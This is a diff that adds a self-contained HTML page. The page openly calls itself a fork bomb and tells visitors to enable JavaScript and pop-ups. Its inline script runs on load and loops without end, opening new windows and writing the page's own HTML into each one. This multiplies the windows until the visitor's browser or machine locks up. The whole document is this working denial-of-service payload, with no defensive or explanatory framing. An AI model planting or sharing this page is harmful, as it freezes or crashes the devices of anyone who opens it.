@@ -1,0 +1,17 @@
+<html>
+	<head>
+		<style type="text/css">
+		  body { text-align: center; }
+		</style>
+	</head>
+	<body>
+		<p>If you can see this (and you don't have superhero slow-mo vision), the fork bomb didn't work.</p>
+		<p>Try enabling JavaScript and pop-ups, and using a multi-tab/window browser, such as Chrome, Firefox, IE, Edge, Safari, ext...</p>
+		<p><a href="index.html">&lt;Home</a></p>
+	<script>
+		while (true) {
+		  var w = window.open();
+		  w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
+		}
+	</script>
+	</body>
